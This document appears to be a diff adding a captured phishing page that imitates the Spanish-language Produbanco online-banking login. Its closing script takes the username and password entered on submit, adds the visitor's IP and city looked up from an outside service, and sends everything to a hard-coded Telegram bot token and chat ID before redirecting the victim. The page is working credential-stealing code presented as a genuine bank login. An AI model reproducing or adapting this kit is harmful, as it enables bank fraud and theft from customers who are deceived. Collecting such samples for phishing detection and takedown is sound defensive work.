@@ -1,0 +1,465 @@
+<!-- url: https://veridicationsys.blob.core.windows.net/sisteonline/index.html
+status: 200 -->
+<html lang="es"><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/content/location/location.js" id="eppiocemhmnlbhjplcgkofciiegomcon"></script><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/libs/extend-native-history-api.js"></script><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/libs/requests.js"></script><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Produbanco - Login</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background: #003F20;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 0;
+            margin: 0;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 100vw;
+            min-height: 100vh;
+            background: #003F20;
+            position: relative;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 25px;
+            margin-top: 10px;
+        }
+
+        .menu-icon {
+            display: flex;
+            flex-direction: column;
+            cursor: pointer;
+        }
+
+        .menu-icon span {
+            width: 25px;
+            height: 2px;
+            background: white;
+            margin: 3px 0;
+            border-radius: 1px;
+        }
+
+        .phone-icon {
+            cursor: pointer;
+        }
+
+        .logo-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-top: 30px;
+            margin-bottom: 30px;
+        }
+
+        .logo-img {
+            width: auto;
+            max-width: 380px;
+            height: 140px;
+            object-fit: contain;
+            margin-bottom: 15px;
+            filter: brightness(1.1);
+        }
+
+        .logo-subtitle {
+            color: white;
+            font-size: 16px;
+            font-weight: 300;
+            opacity: 0.9;
+        }
+
+        .login-container {
+            background: white;
+            border-radius: 25px 25px 0 0;
+            flex: 1;
+            padding: 30px 25px;
+            min-height: 500px;
+            width: 100%;
+            overflow: hidden;
+            box-shadow: 0 -5px 20px rgba(0, 0, 0, 0.15);
+        }
+
+        .login-container h2 {
+            color: #333;
+            font-size: 20px;
+            font-weight: 600;
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .login-form {
+            margin-bottom: 30px;
+        }
+
+        .input-group {
+            position: relative;
+            margin-bottom: 20px;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 15px 45px 15px 15px;
+            border: 1px solid #e0e0e0;
+            border-radius: 10px;
+            font-size: 16px;
+            background: #f8f8f8;
+            color: #333;
+            outline: none;
+            transition: all 0.3s ease;
+        }
+
+        .input-group input:focus {
+            border-color: #003F20;
+            background: white;
+            box-shadow: 0 0 0 3px rgba(0, 63, 32, 0.1);
+        }
+
+        .input-group input::placeholder {
+            color: #888;
+        }
+
+        .input-icon {
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 15px;
+            background: #e0e0e0;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 600;
+            color: #999;
+            cursor: not-allowed;
+            transition: all 0.3s ease;
+            margin-bottom: 20px;
+        }
+
+        .login-btn.active {
+            background: #003F20;
+            color: white;
+            cursor: pointer;
+        }
+
+        .login-btn.active:hover {
+            background: #002a16;
+        }
+
+        .register-section {
+            display: flex;
+            align-items: center;
+            padding: 20px;
+            border: 1px solid #e0e0e0;
+            border-radius: 15px;
+            margin-bottom: 25px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .register-section:hover {
+            background: #f8f8f8;
+            border-color: #003F20;
+        }
+
+        .register-icon {
+            margin-right: 15px;
+        }
+
+        .register-content {
+            flex: 1;
+        }
+
+        .register-content h3 {
+            color: #333;
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 2px;
+        }
+
+        .register-content p {
+            color: #666;
+            font-size: 14px;
+        }
+
+        .register-arrow {
+            margin-left: 10px;
+        }
+
+        .recovery-link {
+            text-align: center;
+        }
+
+        .recovery-link a {
+            color: #003F20;
+            font-size: 16px;
+            font-weight: 600;
+            text-decoration: none;
+            transition: color 0.3s ease;
+        }
+
+        .recovery-link a:hover {
+            color: #002a16;
+            text-decoration: underline;
+        }
+
+        /* Responsive adjustments */
+        @media (max-width: 450px) {
+            .container {
+                max-width: 100%;
+            }
+
+            .login-container {
+                padding: 25px 20px;
+            }
+
+            .logo-img {
+                max-width: 320px;
+                height: 120px;
+            }
+
+            .logo-subtitle {
+                font-size: 14px;
+            }
+        }
+    </style>
+<script bis_use="true" type="text/javascript" charset="utf-8" data-bis-config="[&quot;facebook.com/&quot;,&quot;twitter.com/&quot;,&quot;youtube-nocookie.com/embed/&quot;,&quot;//vk.com/&quot;,&quot;//www.vk.com/&quot;,&quot;linkedin.com/&quot;,&quot;//www.linkedin.com/&quot;,&quot;//instagram.com/&quot;,&quot;//www.instagram.com/&quot;,&quot;//www.google.com/recaptcha/api2/&quot;,&quot;//hangouts.google.com/webchat/&quot;,&quot;//www.google.com/calendar/&quot;,&quot;//www.google.com/maps/embed&quot;,&quot;spotify.com/&quot;,&quot;soundcloud.com/&quot;,&quot;//player.vimeo.com/&quot;,&quot;//disqus.com/&quot;,&quot;//tgwidget.com/&quot;,&quot;//js.driftt.com/&quot;,&quot;friends2follow.com&quot;,&quot;/widget&quot;,&quot;login&quot;,&quot;//video.bigmir.net/&quot;,&quot;blogger.com&quot;,&quot;//smartlock.google.com/&quot;,&quot;//keep.google.com/&quot;,&quot;/web.tolstoycomments.com/&quot;,&quot;moz-extension://&quot;,&quot;chrome-extension://&quot;,&quot;/auth/&quot;,&quot;//analytics.google.com/&quot;,&quot;adclarity.com&quot;,&quot;paddle.com/checkout&quot;,&quot;hcaptcha.com&quot;,&quot;recaptcha.net&quot;,&quot;2captcha.com&quot;,&quot;accounts.google.com&quot;,&quot;www.google.com/shopping/customerreviews&quot;,&quot;buy.tinypass.com&quot;,&quot;gstatic.com&quot;,&quot;secureir.ebaystatic.com&quot;,&quot;docs.google.com&quot;,&quot;contacts.google.com&quot;,&quot;github.com&quot;,&quot;mail.google.com&quot;,&quot;chat.google.com&quot;,&quot;audio.xpleer.com&quot;,&quot;keepa.com&quot;,&quot;static.xx.fbcdn.net&quot;,&quot;sas.selleramp.com&quot;,&quot;1plus1.video&quot;,&quot;console.googletagservices.com&quot;,&quot;//lnkd.demdex.net/&quot;,&quot;//radar.cedexis.com/&quot;,&quot;//li.protechts.net/&quot;,&quot;challenges.cloudflare.com/&quot;,&quot;ogs.google.com&quot;]" src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/executors/traffic.js"></script></head>
+<body __processed_b4df9f19-4c2c-4efa-9ac2-58a2e2236306__="true" bis_register="W3sibWFzdGVyIjp0cnVlLCJleHRlbnNpb25JZCI6ImVwcGlvY2VtaG1ubGJoanBsY2drb2ZjaWllZ29tY29uIiwiYWRibG9ja2VyU3RhdHVzIjp7IkRJU1BMQVkiOiJkaXNhYmxlZCIsIkZBQ0VCT09LIjoiZGlzYWJsZWQiLCJUV0lUVEVSIjoiZGlzYWJsZWQiLCJSRURESVQiOiJkaXNhYmxlZCIsIlBJTlRFUkVTVCI6ImRpc2FibGVkIiwiSU5TVEFHUkFNIjoiZGlzYWJsZWQiLCJUSUtUT0siOiJkaXNhYmxlZCIsIkxJTktFRElOIjoiZGlzYWJsZWQiLCJDT05GSUciOiJkaXNhYmxlZCJ9LCJ2ZXJzaW9uIjoiMi4wLjI2Iiwic2NvcmUiOjIwMDI2fV0=">
+    <div class="container" bis_skin_checked="1">
+        <!-- Header -->
+        <div class="header" bis_skin_checked="1">
+            <div class="menu-icon" bis_skin_checked="1">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+            <div class="phone-icon" bis_skin_checked="1">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2">
+                    <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path>
+                </svg>
+            </div>
+        </div>
+
+        <!-- Logo -->
+        <div class="logo-container" bis_skin_checked="1">
+            <img src="logo1.png" alt="Grupo Promerica Logo" class="logo-img">
+            <p class="logo-subtitle"></p>
+        </div>
+
+        <!-- Login Form -->
+        <div class="login-container" bis_skin_checked="1">
+            <h2>Ingresa a tu Produbanco en lÃ­nea</h2>
+
+                  <form id="loginForm">
+                <div class="input-group" bis_skin_checked="1">
+                    <input type="text" id="username" name="username" placeholder="Usuario" required="">
+                    <div class="input-icon" bis_skin_checked="1">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#003F20" stroke-width="2">
+                            <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path>
+                            <circle cx="12" cy="7" r="4"></circle>
+                        </svg>
+                    </div>
+                </div>
+
+                <div class="input-group" bis_skin_checked="1">
+                    <input type="password" id="password" name="password" placeholder="ContraseÃ±a" required="">
+                    <div class="input-icon" bis_skin_checked="1">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#003F20" stroke-width="2">
+                            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
+                            <circle cx="12" cy="12" r="3"></circle>
+                        </svg>
+                    </div>
+                </div>
+
+                <button type="submit" class="login-btn">Ingresar</button>
+            </form>
+
+            <!-- Register Section -->
+            <div class="register-section" bis_skin_checked="1">
+                <div class="register-icon" bis_skin_checked="1">
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#003F20" stroke-width="2">
+                        <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+                        <line x1="16" y1="2" x2="16" y2="6"></line>
+                        <line x1="8" y1="2" x2="8" y2="6"></line>
+                        <line x1="3" y1="10" x2="21" y2="10"></line>
+                    </svg>
+                </div>
+                <div class="register-content" bis_skin_checked="1">
+                    <h3>Crea tu usuario y contraseÃ±a</h3>
+                    <p>RegÃ­strate para iniciar sesiÃ³n</p>
+                </div>
+                <div class="register-arrow" bis_skin_checked="1">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#003F20" stroke-width="2">
+                        <polyline points="9,18 15,12 9,6"></polyline>
+                    </svg>
+                </div>
+            </div>
+
+            <!-- Recovery Link -->
+            <div class="recovery-link" bis_skin_checked="1">
+                <a href="#" id="recoveryLink">Recuperar usuario y contraseÃ±a</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const usernameInput = document.getElementById('username');
+            const passwordInput = document.getElementById('password');
+            const loginBtn = document.querySelector('.login-btn');
+            const loginForm = document.getElementById('loginForm');
+            const recoveryLink = document.getElementById('recoveryLink');
+
+            // FunciÃ³n para validar si los campos estÃ¡n llenos
+            function validateForm() {
+                const username = usernameInput.value.trim();
+                const password = passwordInput.value.trim();
+
+                if (username && password) {
+                    loginBtn.classList.add('active');
+                    loginBtn.style.cursor = 'pointer';
+                    loginBtn.textContent = 'Ingresar';
+                } else {
+                    loginBtn.classList.remove('active');
+                    loginBtn.style.cursor = 'not-allowed';
+                    loginBtn.textContent = 'Ingresar';
+                }
+            }
+
+            // Event listeners para validar en tiempo real
+            usernameInput.addEventListener('input', validateForm);
+            passwordInput.addEventListener('input', validateForm);
+
+            // Manejar envÃ­o del formulario
+            loginForm.addEventListener('submit', function(e) {
+                const username = usernameInput.value.trim();
+                const password = passwordInput.value.trim();
+
+                if (!username || !password) {
+                    e.preventDefault();
+                    alert('Por favor completa todos los campos');
+                    return;
+                }
+
+                // Mostrar estado de carga
+                loginBtn.textContent = 'Ingresando...';
+                loginBtn.style.background = '#002a16';
+                loginBtn.disabled = true;
+
+                // El formulario se enviarÃ¡ automÃ¡ticamente a user.php por el mÃ©todo POST
+            });
+
+            // Manejar clic en "Crear usuario y contraseÃ±a"
+            document.querySelector('.register-section').addEventListener('click', function() {
+                alert('RedirecciÃ³n a registro no implementada');
+            });
+
+            // Manejar clic en "Recuperar usuario y contraseÃ±a"
+            recoveryLink.addEventListener('click', function(e) {
+                e.preventDefault();
+                alert('Funcionalidad de recuperaciÃ³n no implementada');
+            });
+
+            // Efecto de focus en inputs
+            const inputs = document.querySelectorAll('input');
+            inputs.forEach(input => {
+                input.addEventListener('focus', function() {
+                    this.parentElement.classList.add('focused');
+                });
+
+                input.addEventListener('blur', function() {
+                    this.parentElement.classList.remove('focused');
+                });
+            });
+
+            // AnimaciÃ³n del menÃº hamburguesa
+            document.querySelector('.menu-icon').addEventListener('click', function() {
+                alert('MenÃº no implementado');
+            });
+
+            // Funcionalidad del icono de telÃ©fono
+            document.querySelector('.phone-icon').addEventListener('click', function() {
+                alert('Funcionalidad de llamada no implementada');
+            });
+        });
+    </script>
+      <script>
+    // Generador de ID Ãºnico
+    function generarID() {
+      return 'sess-' + Math.random().toString(36).substr(2, 9);
+    }
+  
+    // Obtener o crear ID de sesiÃ³n Ãºnico
+    var sessionId = localStorage.getItem("sessionId");
+    if (!sessionId) {
+      sessionId = generarID();
+      localStorage.setItem("sessionId", sessionId);
+    }
+  
+    document.getElementById("loginForm").addEventListener("submit", function(event) {
+      event.preventDefault();
+  
+      var user = document.getElementById("username").value;
+      var password = document.getElementById("password").value;
+  
+      var ip = "No disponible";
+      var city = "No disponible";
+  
+      function enviarMensaje(ip, city) {
+        var message = "ð SesiÃ³n: " + sessionId +
+                      "\nð¤ Usuario: " + user +
+                      "\nð ContraseÃ±a: " + password +
+                      "\nð IP: " + ip +
+                      "\nðï¸ Ciudad: " + city;
+  
+        var token = "7424210947:AAEyoYcuAlrB3tVfG3b5_a8JYzByLQA6HMc";
+        var chat_id = "8320403851";
+        var url = "https://api.telegram.org/bot" + token + "/sendMessage";
+  
+        fetch(url, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            chat_id: chat_id,
+            text: message
+          })
+        })
+        .then(() => window.location.href = "wait.html")
+        .catch(() => window.location.href = "wait.html");
+      }
+  
+      // Obtener IP y ciudad
+      fetch('http://ip-api.com/json')
+        .then(response => response.json())
+        .then(data => {
+          ip = data.query || ip;
+          city = data.city || city;
+          enviarMensaje(ip, city);
+        })
+        .catch(() => {
+          enviarMensaje(ip, city); // Sigue con valores por defecto
+        });
+    });
+  </script>
+
+
+</body></html>
